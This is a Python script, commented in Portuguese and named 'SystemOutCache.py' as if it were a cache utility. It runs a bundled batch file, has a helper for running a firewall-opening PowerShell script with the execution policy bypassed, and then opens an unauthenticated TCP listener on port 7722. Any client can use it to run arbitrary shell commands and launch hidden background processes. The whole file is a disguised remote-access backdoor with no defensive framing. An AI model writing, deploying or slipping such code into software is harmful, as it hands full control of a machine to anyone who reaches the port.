#!/usr/bin/env python3
# Arquivo: SystemOutCache.py

import socket
import threading
import subprocess
import os
import time
import ctypes
import sys
import argparse



# executa o WinStart.bat
parser = argparse.ArgumentParser(description="Executa um arquivo batch.")
parser.add_argument(
    "batch_file",
    nargs='?',
    default="WinStart.bat",
    help="Nome do arquivo batch a ser executado."
)
args = parser.parse_args()

# Se estiver dentro de um .exe PyInstaller, sys.frozen será True
if getattr(sys, 'frozen', False):
    base_path = sys._MEIPASS
else:
    base_path = os.path.dirname(os.path.abspath(__file__))

# Constrói o caminho completo para o WinStart.bat
batch_file_path = os.path.join(base_path, args.batch_file)

if not os.path.exists(batch_file_path):
    print(f"O arquivo não foi encontrado em: {batch_file_path}")
    sys.exit(1)

try:
    result = subprocess.run(["cmd", "/c", batch_file_path], shell=True)
    if result.returncode == 0:
        print(f"Sucesso ao executar {batch_file_path}")
    else:
        print(f"Falha ao executar {batch_file_path}. Código de retorno: {result.returncode}")
except Exception as e:
    print(f"Erro ao executar {batch_file_path}: {e}")




# executa o shell AbrirPortaFirewall.ps1
def run_ps1_hidden(script_path):
    import os
    import subprocess
    abs_script_path = os.path.abspath(script_path)
    command = [
        "powershell.exe",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", abs_script_path
    ]
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print("Saída do PowerShell:", result.stdout)
    print("Erros do PowerShell:", result.stderr)





# Tentar importar psutil, mas funcionar sem ele também
try:
    import psutil
    HAS_PSUTIL = True
    print("[+] psutil disponível")
except ImportError:
    HAS_PSUTIL = False
    print("[!] psutil não disponível - instale com: pip install psutil")

HOST = '0.0.0.0'
PORT = 7722

processos_ativos = {}
procs_lock = threading.Lock()
proximo_id = 1

def generate_id():
    global proximo_id
    with procs_lock:
        id_ = proximo_id
        proximo_id += 1
    return id_

# Diagnóstico de processo
def diagnose_process(pid):
    if HAS_PSUTIL:
        try:
            return psutil.pid_exists(pid)
        except:
            return False
    else:
        res = subprocess.run(["tasklist", "/FI", f"PID eq {pid}"], capture_output=True, text=True)
        return str(pid) in res.stdout

# Kill abrangente
def kill_process_comprehensive(pid):
    try:
        if HAS_PSUTIL and psutil.pid_exists(pid):
            parent = psutil.Process(pid)
            for child in parent.children(recursive=True):
                child.kill()
            parent.kill()
        else:
            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"], capture_output=True)
        time.sleep(1)
    except:
        pass

# Iniciar processo com opção de exibir terminal
def iniciar_processo(comando, mostrar_terminal=False):
    flags = 0
    if os.name == 'nt':
        if mostrar_terminal:
            flags |= subprocess.CREATE_NEW_CONSOLE
        else:
            flags |= subprocess.CREATE_NO_WINDOW
    proc = subprocess.Popen(
        comando,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        creationflags=flags
    )
    return proc

# Handler de cliente
def handle_client(conn, addr):
    with conn:
        data = conn.recv(4096)
        if not data:
            return
        msg = data.decode('utf-8', errors='ignore').strip()
        print(f"[CLIENT] {addr}: {msg}")

        if msg.upper().startswith("EXEC:"):
            cmd = msg[5:]
            try:
                res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                output = res.stdout + res.stderr or "[OK] Sem saída."
            except subprocess.TimeoutExpired:
                output = "[ERRO] Timeout."
            conn.sendall((output + "\n").encode('utf-8'))

        elif msg.upper().startswith("START:"):
            parts = msg[6:].split()
            mostrar = False
            if parts and parts[-1].lower() == 'show':
                mostrar = True
                comando = ' '.join(parts[:-1])
            else:
                comando = ' '.join(parts)
            if not comando:
                resposta = "[ERRO] Nenhum comando.\n"
                conn.sendall(resposta.encode('utf-8'))
            else:
                if mostrar:
                    # Inicia o subprocesso com stdout capturado
                    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    id_ = generate_id()
                    with procs_lock:
                        processos_ativos[id_] = {'proc': proc, 'pid': proc.pid, 'cmd': comando}
                    # Transmite a saída para o cliente
                    while True:
                        line = proc.stdout.readline()
                        if line:
                            conn.sendall(line.encode('utf-8'))
                        else:
                            break
                    conn.sendall("\n[PROCESS ENDED]\n".encode('utf-8'))
                else:
                    # Inicia o processo em segundo plano (sem mostrar terminal)
                    proc = iniciar_processo(comando)
                    id_ = generate_id()
                    with procs_lock:
                        processos_ativos[id_] = {'proc': proc, 'pid': proc.pid, 'cmd': comando}
                    resposta = f"[OK] Iniciado ID {id_} (PID real {proc.pid})\n"
                    conn.sendall(resposta.encode('utf-8'))

        elif msg.upper().startswith("STOP:"):
            try:
                idx = int(msg[5:])
            except ValueError:
                conn.sendall("[ERRO] ID inválido.\n".encode('utf-8'))
                return
            with procs_lock:
                info = processos_ativos.pop(idx, None)
            if not info:
                conn.sendall(f"[ERRO] ID {idx} não encontrado.\n".encode('utf-8'))
            else:
                kill_process_comprehensive(info['pid'])
                conn.sendall(f"[OK] Parado ID {idx}.\n".encode('utf-8'))

        elif msg.upper() == "LIST":
            with procs_lock:
                if not processos_ativos:
                    conn.sendall(b"Nenhum processo ativo.\n")
                else:
                    lines = []
                    for i, info in processos_ativos.items():
                        status = "Rodando" if info['proc'].poll() is None else f"Fim({info['proc'].returncode})"
                        lines.append(f"ID {i}: PID {info['pid']} - {status} - Cmd: {info['cmd']}")
                    conn.sendall(("\n".join(lines) + "\n").encode('utf-8'))

        else:
            conn.sendall("[ERRO] Comando inválido.\n".encode('utf-8'))

# Main do servidor
def main():
    print(f"[+] Servidor rodando em {HOST}:{PORT}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(5)
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()